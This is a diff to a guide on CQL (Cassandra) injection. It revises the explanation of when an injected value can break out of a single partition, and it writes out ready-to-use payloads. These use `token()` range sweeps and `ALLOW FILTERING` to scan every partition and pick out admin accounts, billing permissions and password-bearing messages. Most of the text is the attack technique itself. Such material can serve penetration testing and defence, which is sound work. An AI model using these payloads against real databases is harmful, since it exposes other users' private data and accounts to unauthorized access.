@@ -40,18 +40,17 @@ SELECT * FROM messages WHERE account_id = '...' AND box = 'inbox'
 AND body CONTAINS 'password' ALLOW FILTERING
 ```
 
-Dropping the account scope entirely is the stronger move, where the template lets the injection reach the first predicate. If the injectable value is `account_id`, a payload that neutralizes the key constraint and re-filters across the ring exposes other accounts:
+Scanning beyond a single partition requires a sink where no fixed partition-key equality precedes the injection, because `ALLOW FILTERING` does not remove an existing `account_id = '...'` predicate (that equality still pins the query to one partition). The case that works is a query filtering only on the injected non-key column, such as an admin or search endpoint `SELECT * FROM messages WHERE status = '<inj>'`, where a `token()` range then sweeps the whole partitioner ring:
 
 ```sql
-' AND token(account_id) >= token('') ALLOW FILTERING /*
+x' AND token(account_id) >= token('') ALLOW FILTERING /*
 ```
 
-`token()` ranges span the whole partitioner ring, so the scan walks every partition. Collection and secondary-column predicates then pick out the rows of interest:
+`token()` spans every partition, so the scan walks the ring. Collection and secondary-column predicates then pick out the rows of interest:
 
 ```sql
-' AND role = 'admin' ALLOW FILTERING /*
-' AND permissions CONTAINS 'billing' ALLOW FILTERING /*
-' AND created_at > '2020-01-01' ALLOW FILTERING /*
+x' AND role = 'admin' ALLOW FILTERING /*
+x' AND permissions CONTAINS 'billing' ALLOW FILTERING /*
 ```
 
 ## Combining with IN and ranges
